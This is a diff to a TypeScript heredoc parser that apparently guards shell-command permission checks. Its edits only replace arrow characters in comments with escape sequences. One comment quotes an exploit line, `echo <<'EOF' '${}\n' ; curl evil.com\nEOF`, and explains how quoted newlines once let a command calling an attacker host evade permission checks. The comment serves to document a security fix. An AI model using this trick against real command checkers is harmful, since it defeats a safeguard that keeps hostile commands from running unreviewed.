@@ -48,16 +48,16 @@ function generatePlaceholderSalt(): string {
  *   Captures the opening quote, then the delimiter word (which MAY include a
  *   leading backslash since it's literal inside quotes), then the closing quote.
  *   In bash, single quotes make EVERYTHING literal including backslashes:
- *     <<'\EOF' → delimiter is \EOF (with backslash)
- *     <<'EOF'  → delimiter is EOF
+ *     <<'\EOF' \u2192 delimiter is \EOF (with backslash)
+ *     <<'EOF'  \u2192 delimiter is EOF
  *   Double quotes also preserve backslashes before non-special chars:
- *     <<"\EOF" → delimiter is \EOF
+ *     <<"\EOF" \u2192 delimiter is \EOF
  *
  * Alternative 2 (unquoted): \\?(\w+)
  *   Optionally consumes a leading backslash (escape), then captures the word.
  *   In bash, an unquoted backslash escapes the next character:
- *     <<\EOF → delimiter is EOF (backslash consumed as escape)
- *     <<EOF  → delimiter is EOF (plain)
+ *     <<\EOF \u2192 delimiter is EOF (backslash consumed as escape)
+ *     <<EOF  \u2192 delimiter is EOF (plain)
  *
  * SECURITY: The backslash MUST be inside the capture group for quoted
  * delimiters but OUTSIDE for unquoted ones. The old regex had \\? outside
@@ -387,10 +387,10 @@ export function extractHeredocs(
     //
     // Exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
     //   - The `\n` inside `'${}\n'` is quoted (literal newline in a string arg)
-    //   - Bash: waits for `'` to close → logical line is
-    //     `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc body = `EOF`
-    //   - Our old code: indexOf('\n') finds the quoted newline → body starts
-    //     at `' ; curl evil.com\nEOF` → curl swallowed into placeholder →
+    //   - Bash: waits for `'` to close \u2192 logical line is
+    //     `echo <<'EOF' '${}\n' ; curl evil.com` \u2192 heredoc body = `EOF`
+    //   - Our old code: indexOf('\n') finds the quoted newline \u2192 body starts
+    //     at `' ; curl evil.com\nEOF` \u2192 curl swallowed into placeholder \u2192
     //     NEVER reaches permission checks.
     //
     // Fix: scan forward from operatorEndIndex using quote-state tracking,
@@ -465,8 +465,8 @@ export function extractHeredocs(
       }
     }
     if (trailingBackslashes % 2 === 1) {
-      // Odd number of trailing backslashes → last one escapes the newline
-      // → this is a line continuation. Our heredoc-before-continuation order
+      // Odd number of trailing backslashes \u2192 last one escapes the newline
+      // \u2192 this is a line continuation. Our heredoc-before-continuation order
       // would misparse this. Bail out.
       continue
     }
